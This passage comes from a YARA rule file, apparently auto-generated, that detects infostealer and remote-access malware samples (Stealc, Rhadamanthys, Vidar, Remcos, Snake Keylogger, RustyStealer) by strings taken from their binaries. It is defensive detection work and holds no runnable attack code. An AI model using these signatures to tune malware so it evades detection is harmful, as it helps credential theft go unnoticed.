      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "lbT.exe" fullword wide /* score: '19.00'*/
      $s4 = "i chia cho 0!!!" fullword wide /* score: '13.00'*/
      $s5 = "lbT.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "tget xx" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5f921151 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5f921151.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5f9211510339c99b3b0dcf99aa5ed3ab7958bfb37117551c9eae256dec0cf181"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "DKo.exe" fullword wide /* score: '19.00'*/
      $s4 = "i chia cho 0!!!" fullword wide /* score: '13.00'*/
      $s5 = "DKo.pdb" fullword ascii /* score: '11.00'*/
      $s6 = "cRVn!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2c7e7bf4 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2c7e7bf4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2c7e7bf4cd14456572dd850552354b46e89d511300f5dce48561a4f347f8d4b2"
   strings:
      $s1 = "ByWS.exe" fullword wide /* score: '22.00'*/
      $s2 = "ByWS.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "GenerateExportContent" fullword ascii /* score: '12.00'*/
      $s4 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s5 = "Analogous" fullword wide /* score: '11.00'*/
      $s6 = "\\6=)D\\(" fullword ascii /* score: '10.00'*/ /* hex encoded string 'm' */
      $s7 = "ColorSchemeGenerator.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s8 = "Error exporting file: " fullword wide /* score: '10.00'*/
      $s9 = "get_SchemeType" fullword ascii /* score: '9.00'*/
      $s10 = "GetFileFilter" fullword ascii /* score: '9.00'*/
      $s11 = "GenerateAnalogous" fullword ascii /* score: '9.00'*/
      $s12 = "GetColorHex" fullword ascii /* score: '9.00'*/
      $s13 = "{0} ({1}) - {2} colors" fullword wide /* score: '9.00'*/
      $s14 = "Export Color Scheme" fullword wide /* score: '9.00'*/
      $s15 = "Complementary" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule Stealc_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__4741534f {
   meta:
      description = "_subset_batch - file Stealc(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_4741534f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4741534f1ec65dc421fc7675f979c53e6408ac9722eb3b9d3db164d277d09144"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "/dumps9taw" fullword ascii /* score: '14.00'*/
      $s3 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s4 = ".QfIwd:\\(v" fullword ascii /* score: '10.00'*/
      $s5 = "+G%g:\\" fullword ascii /* score: '9.50'*/
      $s6 = "* ;S.k" fullword ascii /* score: '9.00'*/
      $s7 = "5%I%n." fullword ascii /* score: '8.00'*/
      $s8 = "ftwareuq" fullword ascii /* score: '8.00'*/
      $s9 = " udmu4%N%4w" fullword ascii /* score: '8.00'*/
      $s10 = "tUeQZ /Vp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      all of them
}

rule Rhadamanthys_signature__8cd0ffc23a93d40428f4277ead307c71_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_8cd0ffc23a93d40428f4277ead307c71(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e7ade43f465f3236184a569f536b9cedfd4d692a7d8512bba1f65e4bfe71aea1"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s3 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s4 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s5 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s6 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      all of them
}

rule Stealc_signature__8cd0ffc23a93d40428f4277ead307c71_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_8cd0ffc23a93d40428f4277ead307c71(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bc63e5b5d616f5c554bb2d2e4121590cf7a1dddfd3b362e2a5a4ebb74c086e56"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "<iAEiQ10!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule Stealc_signature__8cd0ffc23a93d40428f4277ead307c71_imphash__1bd80ac9 {
   meta:
      description = "_subset_batch - file Stealc(signature)_8cd0ffc23a93d40428f4277ead307c71(imphash)_1bd80ac9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1bd80ac9b25684d8a761d999933f416fb8afa628980eb1d06413685799944e10"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "<iAEiQ10!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule ResolverRAT_signature_ {
   meta:
      description = "_subset_batch - file ResolverRAT(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87773b42629277b367e948606aba6c7de6cb8418e1f4e8922617567e8b7cdea2"
   strings:
      $s1 = "PO#4503249566.com" fullword ascii /* score: '15.00'*/
      $s2 = "+aTsiZDEt" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__3 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b18aa5a1a02bcd28e242c1d23585d565f88063e6c1b251873e5872c95652679a"
   strings:
      $x1 = "lejXwkiAhWYoWbfXDzNkHYBVjuHKdXQLuZQ2YswOaAFKkShEibu/saHKqhQHzIOsrbBBuOvgJB6YnErltnk1EjlAUct2gEicNiAbwSLzOjWfSUiU4cKRENQsa+GGF0LX" ascii /* score: '60.00'*/
      $s2 = "%nYASxrgMzToogCIkfyUPdaRhbBzFHgXsSFFATvGzrcPzYQarOacIyvhNHSqwsaFSvwWaxHQjsUYAKSJ% \"%meauIexFAzoJDyPZhLCwxLYEhDes%w%psgyzyEgsbeU" ascii /* score: '24.00'*/
      $s3 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%OerChnShzRCxkBSasswS%K%cUgnRKgcp" ascii /* score: '24.00'*/
      $s4 = "%nYASxrgMzToogCIkfyUPdaRhbBzFHgXsSFFATvGzrcPzYQarOacIyvhNHSqwsaFSvwWaxHQjsUYAKSJ% \"%zkUcOFVSNyvYqaeGOeKIounbeNTt%m%szawRPaKyrIo" ascii /* score: '23.00'*/
      $s5 = "%yLNJJpEJCRbRfFIIouFNYYMrbcqBrGJGjWloqVYyKWHrBPyGKvOrqQPayWhgzDSvIUhIUUSSVHCCQVpMdjqvsSQSGL% \"%NOCOvEoHcSrcOYMzDFvy%Q%BIhcXDOJR" ascii /* score: '22.00'*/
      $s6 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%uYFfZygwarWNuclhwIlTPIYtTr%d%fdh" ascii /* score: '22.00'*/
      $s7 = "%JzQzqoErZoYgyhWZtwouuPhRPDqZbNuUABFg%@%AMQIXEuobefsIYeZpduSyjnyfQMuEfxcpnskYlWKmcn%%KhTpPuLYKOmQYRdHszkwhDCUfuBDGkfVwPnx%i%XeJU" ascii /* score: '22.00'*/
      $s8 = "%FcZOqDqkKOYuQgxHlyRAtHowLGYaQwKBFbHqSEyUZwjRsQqFXzcKhgQyodCkfQTOEXooZGogAwawXWDuPTCRTzUYKIBpBNpIcVMVcBfQKvKkGTaSZIULOCuECPeRFyf" ascii /* score: '22.00'*/
      $s9 = "%nYASxrgMzToogCIkfyUPdaRhbBzFHgXsSFFATvGzrcPzYQarOacIyvhNHSqwsaFSvwWaxHQjsUYAKSJ% \"%VwlIYZjOxDiBvrjhzQlmdQ%A%epJjTDUnpcrfAWoWsV" ascii /* score: '22.00'*/
      $s10 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%jnCzvXdwwCxUJiNpDavFleC%D%qdnjTJ" ascii /* score: '21.00'*/
      $s11 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%YqMmAiudhZgvZskBnTKBByaunz%T%LEJ" ascii /* score: '21.00'*/
      $s12 = "xQQEYEFZvhFhm8MGt9bIqNVnP17KvEWdPtJYYchTLYHkP9KgPEPYJnTDgHGeTRu3gLZLb7jKSLwJJVrq91SKL89sb+S+WY+GZ/AXr03Ya0za+bD6hBReE2C6i8SWzZXJ" ascii /* score: '21.00'*/
      $s13 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%QEroUIJtYBkUOudUwxGHPvLPJEW%D%vL" ascii /* score: '20.00'*/
      $s14 = "%ToszHDLjghqmqcvWiONJdgUCPNXDpEPBIezedIuyFlIfnxASwvhEtCMnTpjugHtcSodLdQtZTODrXpPSMEGtWKIGSL% \"%awcVPvDpoHWNqIDbZluD%u%TdIwlJxSH" ascii /* score: '20.00'*/
      $s15 = "%yLNJJpEJCRbRfFIIouFNYYMrbcqBrGJGjWloqVYyKWHrBPyGKvOrqQPayWhgzDSvIUhIUUSSVHCCQVpMdjqvsSQSGL% \"%hehKVdpTSetnbzlQyiKfTPfiaXlS%l%c" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__4 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "44f1db6fccd9f649fc3b5d5c698463c4e1691e3705c5c5962ae1b488475a624b"
   strings:
      $x1 = "TableTypeComponent_File14.36.32532.0D23gKyQqClaig.puvLanguageFileNameVersion1033tw8qvhJk021Klaen.shjMSVCP140.dllSequenceAttribut" ascii /* score: '57.00'*/
      $x2 = ";54Feature attributesPrimary key, name of action, normally appears in sequence table unless private use.The numeric custom actio" ascii /* score: '43.00'*/
      $s3 = "ishFeaturesPublishProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRe" ascii /* score: '29.00'*/
      $s4 = "reFeature_ParentTitleDescriptionDisplayLevelSiliconeFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponents" ascii /* score: '23.00'*/
      $s5 = "astProductVersion7.6.8.0UpgradeCode{96E20E4A-7CC7-406F-8CB3-F69CF3ACDFC3}AdminUISequenceCostInitializeFileCostCostFinalizeExecut" ascii /* score: '21.00'*/
      $s6 = "4853}{E1B94F1F-863F-5103-A080-297CE2959FA5}DirectoryDirectory_ParentDefaultDirLocalAppDataFolderDidrachmTARGETDIR.SourceDirFeatu" ascii /* score: '20.00'*/
      $s7 = "TableTypeComponent_File14.36.32532.0D23gKyQqClaig.puvLanguageFileNameVersion1033tw8qvhJk021Klaen.shjMSVCP140.dllSequenceAttribut" ascii /* score: '19.00'*/
      $s8 = "esFileSizePtxuLQBmcFopackager.dllcabeoIYKNujtiVfsuat11wgttn.exe|Switch_Overlay.exeNG7lAzw7aCEyDNV7f1wovihklqt.dll|VCRUNTIME140.d" ascii /* score: '18.00'*/
      $s9 = "eActionAdminExecuteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePubl" ascii /* score: '18.00'*/
      $s10 = "key connectsText;Formatted;Template;Condition;Guid;Path;Version;Language;Identifier;Binary;UpperCase;LowerCase;Filename;Paths;An" ascii /* score: '16.00'*/
      $s11 = "s a root of the install tree.The default sub-path under parent's path.Primary key used to identify a particular feature record.O" ascii /* score: '16.00'*/
      $s12 = ", set either by the AppSearch action or with the default setting obtained from the Directory table.Remote execution option, one " ascii /* score: '15.00'*/
      $s13 = "ll terminate, returning iesBadActionData.Number that determines the sort order in which the actions are to be executed.  Leave b" ascii /* score: '14.00'*/
      $s14 = ";54Feature attributesPrimary key, name of action, normally appears in sequence table unless private use.The numeric custom actio" ascii /* score: '13.00'*/
      $s15 = "e by launcher or loader.String value for property.  Never null or empty.Name of action to invoke, either in the engine or the ha" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__026ce5e7482c82368e554338ef80854e_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_026ce5e7482c82368e554338ef80854e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1fd98c84f1c3de27f5cbf7e791ea727737f98c6f9a691efb60e2f947fb7c4dbd"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Rhadamanthys_signature__1ce39e07a979f0e3da342ee46f74268b_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1ce39e07a979f0e3da342ee46f74268b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "69391d8f605bce4ca985eb31a516c366cab535348a5c90c27f8af466a078efbb"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule Rhadamanthys_signature__37801b95c438a73e300d9190a7cb0752_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_37801b95c438a73e300d9190a7cb0752(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "329fc71ce853cd0f6c4a4f346681639de2173f6dfd888fcd4497cc7d73ac2f33"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s6 = ",)61=+)61" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aa' */
      $s7 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash__8fdb2fd6 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash)_8fdb2fd6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8fdb2fd689e93b893774d1cb93c88682c69b5d4dd255ed877354086acfdf7e88"
   strings:
      $s1 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s3 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s6 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s7 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s8 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Vidar_signature__37801b95c438a73e300d9190a7cb0752_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_37801b95c438a73e300d9190a7cb0752(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f0311927554d2cc8d96fdcc7756851ce6020e33ac2663a736dca2ad4fd411d48"
   strings:
      $s1 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s2 = "CIJC!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__b2c81b106d11ae81264a5fbcab0aae8b_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b2c81b106d11ae81264a5fbcab0aae8b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "412ca2418f93632714eda5e2bff8ac5dce16635803b805052d0353a0a9c3e28a"
   strings:
      $s1 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s2 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s3 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Stealc_signature__83ff2a6950f98d2f65fd6b1c5c33e68a_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_83ff2a6950f98d2f65fd6b1c5c33e68a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "20af689a1596040d8150691b55df006755e0f6cdfe4fe8ef852d6c526ff888c2"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "<iAEiQ10!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule RustyStealer_signature__771e7060f77651b6120669975f9dfcdb_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_771e7060f77651b6120669975f9dfcdb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "974752017f371e0c6b74ffa781f4ae43929d9504512c4d69340ecb612964e46e"
   strings:
      $s1 = "r7Wz@v#LmN!%Hd?X$4qJs8&TuB^fE1pGFailed to execute shellcode" fullword ascii /* score: '24.00'*/
      $s2 = "fatal runtime error: drop of the panic payload panicked, aborting" fullword ascii /* score: '21.00'*/
      $s3 = "C:\\Users\\xuy\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\cipher-0.4.4\\src\\stream.rs" fullword ascii /* score: '20.00'*/
      $s4 = "C:\\Users\\xuy\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\aes-0.8.4\\src\\soft\\fixslice64.rs" fullword ascii /* score: '20.00'*/
      $s5 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s6 = "dropper.pdb" fullword ascii /* score: '16.00'*/
      $s7 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s8 = "Once instance has previously been poisoned" fullword ascii /* score: '14.00'*/
      $s9 = "library\\std\\src\\sync\\poison\\once.rs" fullword ascii /* score: '14.00'*/
      $s10 = "Local\\RustBacktraceMutex00000000" fullword ascii /* score: '11.00'*/
      $s11 = "SetThreadDescription" fullword ascii /* score: '10.00'*/
      $s12 = "failed to generate unique thread ID: bitspace exhausted" fullword ascii /* score: '10.00'*/
      $s13 = "fatal runtime error: initialization or cleanup bug, aborting" fullword ascii /* score: '10.00'*/
      $s14 = "fatal runtime error: Rust panics must be rethrown, aborting" fullword ascii /* score: '10.00'*/
      $s15 = "CreateThread failedVirtualAlloc failed1234567890123456" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule Stealc_signature__37801b95c438a73e300d9190a7cb0752_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_37801b95c438a73e300d9190a7cb0752(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "984fafd740b3efe1f2606d3aa036440229ee8fa6b7608587820cb1c0064b618f"
   strings:
      $s1 = "UVWSPH" fullword ascii /* reversed goodware string 'HPSWVU' */ /* score: '13.50'*/
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Vidar_signature__37801b95c438a73e300d9190a7cb0752_imphash__1f2af392 {
   meta:
      description = "_subset_batch - file Vidar(signature)_37801b95c438a73e300d9190a7cb0752(imphash)_1f2af392.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1f2af392cafd75426312e4862f6a1cedd40982bb0d49ca85f101fb60109b2b3f"
   strings:
      $s1 = "UVWSPH" fullword ascii /* reversed goodware string 'HPSWVU' */ /* score: '13.50'*/
      $s2 = "[shell32] Documents = %ls" fullword wide /* score: '9.00'*/
      $s3 = "CIJC!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule Rhadamanthys_signature__08a07d9be19d1f329c4ea80bf355ee64_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_08a07d9be19d1f329c4ea80bf355ee64(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "feceef9f8f77f03aa038a64b4eb5a1ae54898e3ce827e7345bba9eb49e261da1"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__08a07d9be19d1f329c4ea80bf355ee64_imphash__09774a8f {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_08a07d9be19d1f329c4ea80bf355ee64(imphash)_09774a8f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "09774a8fdc58fb31fbd0089b328ada61acee072e9e4137dce49d62544b025535"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Stealc_signature__08a07d9be19d1f329c4ea80bf355ee64_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_08a07d9be19d1f329c4ea80bf355ee64(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dc29043726368d8d998c426b351d64ed49a1b1f2572edc8267d7ed994e7d7d6d"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
      $s6 = "<iAEiQ10!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7318d8ba13163a478dbc19f16c0a742f84721121bd8016be27a228a5b1aac86b"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s3 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s4 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s5 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
      $s6 = "AhmNYP -s" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash__ec64fe24 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash)_ec64fe24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec64fe244d21180574fca2a74e1c1d84983ed58dfd7992880591e7759e390f10"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "                <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s3 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s4 = "       processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s6 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
      $s7 = "CoCreateInstance(ShellLink)" fullword wide /* score: '9.00'*/
      $s8 = ";$;+;2;?;c;" fullword ascii /* score: '9.00'*/ /* hex encoded string ',' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Rhadamanthys_signature__1deeab33a3db0d2c20caa9f7afb33436_imphash__f5bc4cd0 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_1deeab33a3db0d2c20caa9f7afb33436(imphash)_f5bc4cd0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5bc4cd08a3e95935a848c97c435a0fc41b3a118c45a5baf3e50e6e69a109aff"
   strings:
      $s1 = "CryptGetHashParam" fullword wide /* score: '12.00'*/
      $s2 = "                <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s3 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s4 = "       processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "GetDIBits(color)" fullword wide /* score: '9.00'*/
      $s6 = "GetObjectW(hbmColor)" fullword wide /* score: '9.00'*/
